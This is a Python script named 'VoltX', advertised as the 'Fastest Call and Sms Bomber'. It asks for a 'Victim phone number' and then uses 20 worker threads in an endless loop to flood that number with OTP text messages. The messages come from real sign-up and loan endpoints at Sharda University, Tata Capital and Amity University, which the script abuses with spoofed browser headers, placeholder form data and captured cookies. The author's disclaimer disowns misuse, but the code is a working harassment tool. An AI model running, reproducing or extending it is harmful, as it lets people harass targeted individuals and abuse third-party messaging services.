


'''The Voltx script has been coded by Shubham Yadav.
You are free to use or copy this code, 
but please ensure that proper credit is given to the original author. 
Remember, taking credit for someone else’s work does not make you a good programmer
—acknowledging and respecting the efforts of others does.'''


##################################################
#####   >>   AUTHOR : SHUBHAM YADAV             ##
#####   >>  MAIL : PSYCHOSHUBHAMM@GMAIL.COM     ##
#####   >>   INSTAGRAM : SHUBHUSHUBHU99         ##
#####   >>   TELEGRAM : SHUBHUSHUBHU99          ##
##################################################


import random
from rich.console import Console
from rich.text import Text
import os
import time
from colorama import Fore, Style, init

# Initialize colorama
init()


import webbrowser
from colorama import Fore, Style
import requests

# Social media links
social_links = {
    "1": "https://github.com/shubhushubhu99",  
    "2": "https://instagram.com/shubhushubhu99",  
    "3": "https://twitter.com/shubhushubhu99",  
    "4": "https://youtube.com/@shubhucyberstudio" 
}

def redirect_to_social_media(choice):
    if choice in social_links:
        webbrowser.open(social_links[choice])
    else:
        print(f"{Fore.RED}Invalid choice! Please try again.{Style.RESET_ALL}")
        webbrowser.open("https://t.me/gucigo")

def initial_page():
    print(f"""{Fore.LIGHTGREEN_EX}Fastest Call and Sms Bomber, {Fore.LIGHTYELLOW_EX}The VoltX!""")
    print(f"""{Fore.CYAN}--------------------------------------------------
|  {Fore.RED}Disclaimer: {Fore.CYAN}By using this, you agree that     |
| you cannot hold the contributors responsible   |
| for any misuse. Use at your own risk           |
--------------------------------------------------""")
    print(f"""{Fore.LIGHTMAGENTA_EX}Show us some support by following me on:

 {Fore.YELLOW}[1] GitHub        
 {Fore.YELLOW}[2] Instagram     
 {Fore.YELLOW}[3] Twitter       
 {Fore.YELLOW}[4] YouTube       
{Style.RESET_ALL}""")
    choice = input(f"{Fore.LIGHTMAGENTA_EX}Choose an option : {Style.RESET_ALL}")
    redirect_to_social_media(choice)




def clear():
    if os.name == "nt": 
        os.system("cls")
    else:
        os.system("clear")

def rich_shadow_text():
    # List of colors to choose from for main logo and border
    logo_colors = ["bold cyan", "bold green", "bold yellow", "bold blue", "bold red", "bold magenta"]
    border_colors = ["bold magenta", "bold yellow", "bold green", "bold blue", "bold red"]

    # Randomly select a color for the logo and border
    logo_color = random.choice(logo_colors)
    border_color = random.choice(border_colors)

    # Ensure border and logo don't have the same color
    while logo_color == border_color:
        border_color = random.choice(border_colors)

    console = Console()
    text_content = '''
██╗   ██╗ ██████╗ ██╗  ████████╗██╗  ██╗
██║   ██║██╔═══██╗██║  ╚══██╔══╝╚██╗██╔╝
██║   ██║██║   ██║██║     ██║    ╚███╔╝ 
╚██╗ ██╔╝██║   ██║██║     ██║    ██╔██╗ 
 ╚████╔╝ ╚██████╔╝███████╗██║   ██╔╝ ██╗
  ╚═══╝   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝    '''

    # Create a Rich Text object
    text = Text(text_content)

    # Apply random color to logo characters
    for i, char in enumerate(text_content):
        if char in '█ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789':
            text.stylize(logo_color, i, i + 1)
        elif char in '╔╚═╗╝║':
            text.stylize(border_color, i, i + 1)

    # Print the styled text with random colors for logo and border
    console.print(text)

def main():
    clear()
    # print(f"""{Fore.LIGHTGREEN_EX}Faster Than the Rest, {Fore.LIGHTYELLOW_EX}Stronger Than the Best!""")
    
    console = Console()    
    rich_shadow_text()
    initial_page()
    clear()
    rich_shadow_text()
    print(f"""{Fore.LIGHTGREEN_EX}Faster Than the Rest, {Fore.LIGHTYELLOW_EX}Stronger Than the Best!
{Fore.CYAN} ___________________________________
| {Fore.LIGHTMAGENTA_EX}     VoltX Fastest Bomber         {Fore.CYAN}|
|___________________________________|
| {Fore.YELLOW}Author    : {Fore.GREEN}Shubham Yadav         {Fore.CYAN}|
| {Fore.YELLOW}Instagram : {Fore.GREEN}shubhushubhu99        {Fore.CYAN}|
|___________________________________|{Style.RESET_ALL}


 """)
main()

# [1] Start Bombing
# [2] Protect Number
# [3] Update 
# [4] exit
# menu_input = int(input("Enter your Choice :"))

# if menu_input == 1:
#     print("Option 1 selected")
# elif menu_input == 2:
#     print("Option 2 selected")
# elif menu_input == 3:
#     print("Option 3 selected")
# elif menu_input == 4:
#     print("Option 4 selected")
# else:
#     print("You have selected invalid option. Please try again!")
#     exit()

data = input(f"{Fore.LIGHTYELLOW_EX}Enter Victim phone number ( without +91 ):")
print(f"{Fore.LIGHTMAGENTA_EX}Use CTRL + C to stop the bomber")



import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import requests
import ssl
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager



# Create a custom adapter that specifies the SSL version
class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        context.set_ciphers('TLSv1.2')  # Use TLS 1.2 instead of SSLv3
        kwargs['ssl_context'] = context
        return super().init_poolmanager(*args, **kwargs)

# Create a session and mount the adapter
session = requests.Session()
adapter = SSLAdapter()
session.mount('https://', adapter)


phone_numbers = [data] 

import requests

# Define API details for the Sharda API
url4 = "https://aweblms.sharda.ac.in/student-panel/api/common/sendRegOtp?utm_source=SU_Website&utm_medium=Header_Ticker&utm_campaign=SU_Admissions_2024"
headers4 = {
    "Host": "aweblms.sharda.ac.in",
    "Content-Length": "1561",
    "Sec-Ch-Ua": '"Chromium";v="127", "Not)A;Brand";v="99"',
    "Accept": "application/json, text/plain, */*",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-US",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryjTEgb3aizAIl76Ke",
    "Origin": "https://medical.sharda.ac.in",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://medical.sharda.ac.in/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}

def send_otp_sharda(phone_number):
    data = (
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="name"\r\n\r\n'
        'Your Name Here\r\n'  # Replace with the actual name
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="email"\r\n\r\n'
        'fck@gmail.com\r\n'
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="mob"\r\n\r\n'
        f'{phone_number}\r\n'
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="state_id"\r\n\r\n'
        'State ID Here\r\n'  # Replace with the actual state ID
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="plan_id"\r\n\r\n'
        'Plan ID Here\r\n'  # Replace with the actual plan ID
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke--\r\n'
    )
    try:
        response = requests.post(url4, headers=headers4, data=data)
        # print(f"Sharda API response: {response.text}")  # Log the response text
        if response.status_code == 200:
            print(f"Sharda OTP sent successfully to {phone_number}!")
        else:
            print(f"Failed to send Sharda OTP to {phone_number}. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"An error occurred (Sharda): {e}")


def otp_send_tatacar(phone_number):
    url = "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp"

    headers = {
        "Host": "hlonline.tatacapital.com",
        "Content-Length": "156",
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Origin": "https://www.tatacapital.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.tatacapital.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i",
    }

    data = {
        "mobileNumber": phone_number,
        "isNew": 1,
        "deviceOs": "web",
        "sourceName": "Bing_Search",
        "subSourceName": None,
        "webOsCapture": "Linux x86_64",
        "deviceCapture": "Web"
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}

import requests

def send_otp_amity(phone_number):
    url = "https://portal.amity.edu/NewOnlineForm/Candidate/SignUpPost"

    headers = {
        "Host": "portal.amity.edu",
        "Content-Length": "227",
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://portal.amity.edu",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://portal.amity.edu/NewOnlineForm/Candidate/SignUp",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i"
    }

    cookies = {
        "first_referrer": "https%3A%2F%2Fwww.google.com%2F",
        "ORG24300": "afe8f879-6fbc-438f-b740-7298d4e58a57",
        "__utma": "30374831.1242311373.1753595261.1753595263.1753595263.1",
        "__utmc": "30374831",
        "__utmz": "30374831.1753595263.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)",
        "__utmt": "1",
        "__utmb": "30374831.1.10.1753595263",
        "_ga": "GA1.2.1242311373.1753595261",
        "_gid": "GA1.2.1655502515.1753595263",
        "ASP.NET_SessionId": "prc50opwtyupxknhr55dcrvc",
        "_ga_5Y1ZH6M81R": "GS2.1.s1753595261$o1$g0$t1753595264$j57$l0$h0",
        "_ga_F0B2MSGHMH": "GS2.1.s1753595261$o1$g0$t1753595264$j57$l0$h0"
    }

    data = {
        "txtCandidateName": "SKKK SM",
        "txtCountryCode": "+91",
        "txtMobile": str(phone_number),
        "txtCandidateEmail": "SKKK@GMAIL.COM",
        "URL": "https://portal.amity.edu/NewOnlineForm/Candidate/SignUp",
        "INTNL": "",
        "SourceReferral": "https://www.google.com/"
    }

    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        if response.status_code == 200:
            print(f"Amity OTP Sent Successfully to {phone_number}")
        else:
            print(f"Amity OTP Failed [{response.status_code}] for {phone_number}")
    except Exception as e:
        print(f"Amity API Error: {e}")




def send_otp(phone_number):
    with ThreadPoolExecutor(max_workers=20) as executor:  # Adjust workers for concurrency
        future_to_api = {

            executor.submit(send_otp_sharda, phone_number): "API3",     #working
            executor.submit(otp_send_tatacar, phone_number):"API7", #working
            executor.submit(send_otp_amity, phone_number): "AMITY", #working

        }

        # Collecting the result from the concurrent execution
        for future in as_completed(future_to_api):
            api_name = future_to_api[future]
            try:
                future.result()
                print(f"{api_name} OTP sent successfully for {phone_number}.")
            except Exception as e:
                print(f"{api_name} encountered an error: {e}")

# Infinite loop to send OTPs
while True:
    
    # Send OTPs to all phone numbers
    for number in phone_numbers:
        send_otp(number)
        # time.sleep(2)
if __name__ == "__main__":
    main()
